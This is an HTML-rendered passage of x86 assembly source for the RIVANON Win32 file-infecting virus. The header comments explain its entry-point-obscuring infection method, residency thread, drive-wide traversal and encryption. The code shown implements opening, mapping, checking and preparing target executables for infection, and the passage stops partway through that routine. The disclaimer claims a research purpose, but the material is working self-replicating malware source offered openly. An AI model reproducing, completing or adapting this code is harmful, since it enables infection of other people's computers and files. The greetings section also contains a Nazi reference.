<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>rivanon.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;RIVANON virus, version 3.9 by Doxtor L. [TKT], June 2003.</span><span class="sc0">
</span><span class="sc1">;Contact: doxtorl38@yahoo.fr</span><span class="sc0">

</span><span class="sc1">;This source code is intended to be compiled using FASM, an open source</span><span class="sc0">
</span><span class="sc1">;assembler easily available on the web.</span><span class="sc0">



</span><span class="sc1">;Some not so usual features:</span><span class="sc0">

</span><span class="sc1">;* This virus don't change entry point of infected programs.</span><span class="sc0">
</span><span class="sc1">;* This virus don't patch opcodes of infected programs.</span><span class="sc0">
</span><span class="sc1">;* This virus don't change section attributes of infected programs.</span><span class="sc0">


</span><span class="sc1">;Here a list of some standard features used:</span><span class="sc0">

</span><span class="sc1">;* Use of a thread to make the virus 'residant'.</span><span class="sc0">
</span><span class="sc1">;* Use of hash codes to retrieve functions of Kernel32 needed.</span><span class="sc0">
</span><span class="sc1">;* Use of a traversal directory routine to parse all drives.</span><span class="sc0">
</span><span class="sc1">;* Use of SEH to make the virus more stable.</span><span class="sc0">
</span><span class="sc1">;* Use of the last section to put the main part of virus.</span><span class="sc0">
</span><span class="sc1">;* Use of encryption with a 'random' key.</span><span class="sc0">
</span><span class="sc1">;* Use of mutex to avoid to have several instances of virus infecting</span><span class="sc0">
</span><span class="sc1">;  in same time.</span><span class="sc0">



</span><span class="sc1">;How does this virus work?</span><span class="sc0">

</span><span class="sc1">;This virus is my new attempt to use a non-standard E.P.O (entry point</span><span class="sc0">
</span><span class="sc1">;obscuring) technique. My last attempt in the same way was the writing of </span><span class="sc0">
</span><span class="sc1">;idele virus. Unfortunately this virus was a bit limited to not say buggy.</span><span class="sc0">
</span><span class="sc1">;I think RIVANON virus fixes the main 'bug' of idele virus yet RIVANON was</span><span class="sc0">
</span><span class="sc1">;totally re-written.</span><span class="sc0">

</span><span class="sc1">;The idea is to create a new import table therefore the 'old' table will be</span><span class="sc0">
</span><span class="sc1">;not changed when Windows will load the program in memory but the program will</span><span class="sc0">
</span><span class="sc1">;continue to 'believe' this table is still alright.The 'old' table can be fill</span><span class="sc0">
</span><span class="sc1">;up with addresses we want. These addresses will be pointing to addresses of</span><span class="sc0">
</span><span class="sc1">;elements of a 'push table'. What's that?  </span><span class="sc0">

</span><span class="sc1">;When a host program will call a function from Kernel32 several push's will be</span><span class="sc0">
</span><span class="sc1">;executed depending wich function is called. The number of push's executed</span><span class="sc0">
</span><span class="sc1">;will be used to know wich function of Kernel32 was called by host program.</span><span class="sc0">
</span><span class="sc1">;Sometime, Idele virus wasn't able to know wich function was called.</span><span class="sc0">
</span><span class="sc1">;After the push's, there is a small routine used to decrypt and allocate some</span><span class="sc0">
</span><span class="sc1">;memory to put the main part of virus there. GlobalAlloc function from</span><span class="sc0">
</span><span class="sc1">;Kernel32 is used to achieve this. For Windows this function is the only one</span><span class="sc0">
</span><span class="sc1">;imported from Kernel32 by an infected program.</span><span class="sc0">

</span><span class="sc1">;The virus will put a loader routine in the end of code section of target</span><span class="sc0">
</span><span class="sc1">;programs. A data section with 'writeable' attribute will be used to put the</span><span class="sc0">
</span><span class="sc1">;new 'import table'. The main code will be put in the end of last section.</span><span class="sc0">

</span><span class="sc1">;This virus was tested on both Windows98 SE and Windows 2000.</span><span class="sc0">
</span><span class="sc1">;Main tests were performed on notepad.exe and calc.exe from Windows98,</span><span class="sc0">
</span><span class="sc1">;These programs when they were infected were still running fine on both</span><span class="sc0">
</span><span class="sc1">;Windows 98 and Windows 2000. For Windows XP i don't have a clue because</span><span class="sc0">
</span><span class="sc1">;i don't use it.</span><span class="sc0">


</span><span class="sc1">;Here a list of macros and subroutines used:</span><span class="sc0">

</span><span class="sc1">;* proc_infectieuse             : start of thread code</span><span class="sc0">
</span><span class="sc1">;* GEN_ALEATOIRE                ; random generator</span><span class="sc0">
</span><span class="sc1">;* RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT  : routine to find targets</span><span class="sc0">
</span><span class="sc1">;                         in current directory</span><span class="sc0">
</span><span class="sc1">;* INFECTION                    : routine to modify target</span><span class="sc0">
</span><span class="sc1">;* proc_seh                 : seh handler</span><span class="sc0">
</span><span class="sc1">;* copie_chaine                 : routine to copy ASCII</span><span class="sc0">
                        </span><span class="sc1">; string null terminated.</span><span class="sc0">
</span><span class="sc1">;* rva_vers_adr_map             ; rva to map address routine</span><span class="sc0">
</span><span class="sc1">;* adr_map_vers_rva             ; map address to rva routine</span><span class="sc0">
</span><span class="sc1">;* aligne                   ; align section size fields</span><span class="sc0">
</span><span class="sc1">;* debut_loader                 ; loader routine</span><span class="sc0">




</span><span class="sc1">;The source code has some comments in french. Anyway, this source code</span><span class="sc0">
</span><span class="sc1">;isn't intended to be read by beginners in vx world. The advanced vxers</span><span class="sc0">
</span><span class="sc1">;don't really need comments to understand how this code works, the code is</span><span class="sc0">
</span><span class="sc1">;enough structured to make it readable without comments.</span><span class="sc0">



</span><span class="sc1">;DISCLAIMER:</span><span class="sc0">

</span><span class="sc1">;This program is a virus, it's not destructive but has ability to infect</span><span class="sc0">
</span><span class="sc1">;all O.S Win32 based computers. I don't release this source code to be used</span><span class="sc0">
</span><span class="sc1">;to infect innocent user puters. It was created for research aims.</span><span class="sc0">

</span><span class="sc1">;Your are the only responsible if you decide to run it.</span><span class="sc0">

</span><span class="sc1">;IF YOU DON'T KNOW WHAT YOU'RE DOING, DON'T COMPILE IT!</span><span class="sc0">


</span><span class="sc1">;Greetings:</span><span class="sc0">


</span><span class="sc1">;Virusbuster    : Thanks to publish my stuff.</span><span class="sc0">
</span><span class="sc1">;Lord Julus     : For your working search traversal routine.</span><span class="sc0">
</span><span class="sc1">;Darkman    : A good nazi can sing Horst Vessel lied by heart.</span><span class="sc0">
</span><span class="sc1">;Morphie    : Too bad we didn't meet in Paris.</span><span class="sc0">
</span><span class="sc1">;Gigabyte   : Editing a vx e-zine is a hard job you're right.</span><span class="sc0">
</span><span class="sc1">;Toofic     : I'm not a pervert old man.</span><span class="sc0">
</span><span class="sc1">;Mandrag0re : Who's the next to be hacked?</span><span class="sc0">
</span><span class="sc1">;Emper0r    : Thanks to publish my stuff in IOC.</span><span class="sc0">
</span><span class="sc1">;Delly      : A good magician can make disappear everything..but you're</span><span class="sc0">
</span><span class="sc1">;         the greatest, you can make appear weed everywhere!</span><span class="sc0">
</span><span class="sc1">;Cryptic    : I remember i must install my network card.</span><span class="sc0">
</span><span class="sc1">;Gato       : I hope everything is alright now, no news from you.</span><span class="sc0">
</span><span class="sc1">;Slagehammer    : A new sample  for your collection.</span><span class="sc0">
</span><span class="sc1">;Vecna      : I'm wondering what is your contribution to 29a7!</span><span class="sc0">

</span><span class="sc1">;And all members of TKT group</span><span class="sc0">

        
</span><span class="sc1">;IN MEMORY OF T2</span><span class="sc0">




</span><span class="sc5">format</span><span class="sc0"> </span><span class="sc5">PE</span><span class="sc0"> </span><span class="sc5">GUI</span><span class="sc0">
</span><span class="sc5">entry</span><span class="sc0"> </span><span class="sc5">commencement</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc12">'include\macro\import.inc'</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc12">'include\macro\stdcall.inc'</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc12">'include\exehdr.inc'</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc12">'include\kernel.inc'</span><span class="sc0">



</span><span class="sc5">DEBUG</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc5">ADR_BASE</span><span class="sc4">=</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">ALIGNEMENT_FICHIER_STANDARD</span><span class="sc4">=</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">ALIGNEMENT_MEMOIRE_STANDARD</span><span class="sc4">=</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">DUREE_PAUSE1</span><span class="sc4">=</span><span class="sc2">120000</span><span class="sc0">
</span><span class="sc5">DUREE_PAUSE2</span><span class="sc4">=</span><span class="sc2">30000</span><span class="sc0">
</span><span class="sc5">MODULE</span><span class="sc4">=</span><span class="sc2">4235536237</span><span class="sc0">
</span><span class="sc5">SIGNATURE_VIRAL</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'VX'</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc5">TYPE_FICHIER_RECHERCHE0</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
</span><span class="sc5">SEH</span><span class="sc4">=</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">display</span><span class="sc0"> </span><span class="sc3">"YOU'RE COMPILING THE DEBUG VERSION OF RIVANON VIRUS"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">else</span><span class="sc0">
</span><span class="sc5">TYPE_FICHIER_RECHERCHE0</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0">
</span><span class="sc5">SEH</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc5">display</span><span class="sc0"> </span><span class="sc3">"YOU'RE COMPILING INFECTIOUS VERSION OF RIVANON VIRUS"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0">
</span><span class="sc5">display</span><span class="sc0"> </span><span class="sc3">"IF YOU DON'T KNOW WHAT YOU'RE DOING PLEASE ERASE THIS PROGRAM"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">

</span><span class="sc5">TYPE_FICHIER_RECHERCHE1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'x.ex'</span><span class="sc0">
</span><span class="sc5">TOUT_FICHIER</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0">
</span><span class="sc5">REMONTE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc0">
</span><span class="sc5">REPERTOIRE_COURANT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc5">REPERTOIRE_PARENT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">REMONTE</span><span class="sc0">
</span><span class="sc5">DERNIER_3_BIT</span><span class="sc4">=</span><span class="sc2">111b</span><span class="sc0">



</span><span class="sc1">;'strutures':</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_BY_NAME</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">adr_mem_alloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;macros utilisees par le virus:</span><span class="sc0">

</span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">GEN_ALEATOIRE</span><span class="sc0">
{

</span><span class="sc1">;generateur aleatoire base sur BBS:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">MODULE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">seed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
}

</span><span class="sc1">;[Debut du code de la fonction principale du virus]:</span><span class="sc0">

</span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">INFECTION</span><span class="sc0">
{

</span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">proc_seh</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0">

</span><span class="sc1">;[Ouverture du fichier cible et creation de son image memoire]:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">struct_recherche</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS_ALIGNE_FICHIER</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,\
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle_fichier_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">PAGE_READWRITE</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,\
</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;[Fin de la creation de l'image memoire du fichier cible]</span><span class="sc0">

</span><span class="sc1">;[Debut de la verification du fichier cible]:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_magic</span><span class="sc4">],</span><span class="sc5">MZ_MAGIC</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_csum</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_csum</span><span class="sc4">],</span><span class="sc5">SIGNATURE_VIRAL</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_IMAGE_FILE_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.FH_Signature</span><span class="sc4">],</span><span class="sc5">PE_MAGIC</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">


</span><span class="sc1">;[Debut de la recherche de la section 'code', la section qui contient</span><span class="sc0">
</span><span class="sc1">;le point d'entree du programme cible]:</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_FILE_HEADER</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.OH_FileAlignment</span><span class="sc4">],</span><span class="sc5">ALIGNEMENT_FICHIER_STANDARD</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;a partir d'ici la variable adr_image_base concerne la cible</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_IMAGE_SECTION_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">recherche_section_code</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">section_code_trouve</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">recherche_section_code</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">


</span><span class="sc5">section_code_trouve</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;[Fin de la routine de recherche de la section 'code];</span><span class="sc0">


</span><span class="sc1">;[Debut de la localisation d'un espace 'vide' et de sa taille dans</span><span class="sc0">
</span><span class="sc1">;la fin de la section 'code']:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">  </span><span class="sc1">;pour tenir compte de la presence eventuelle d'une</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">  </span><span class="sc1">;'table d'import' (celle ci se finissant par db 0,0,0,0)</span><span class="sc0">
        
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nbre_octet_libre_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_espace_libre_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">aligne</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;si la section code a l'attribut ecriture mieux vaut abandonner l'infection:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc1">;[Fin de la localisation d'un espace dans la section 'code']</span><span class="sc0">




</span><span class="sc1">;[Debut de la localisation d'un espace vide a la fin d'une section 'data']:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">recherche_section_data</span><span class="sc4">:</span><span class="sc0">
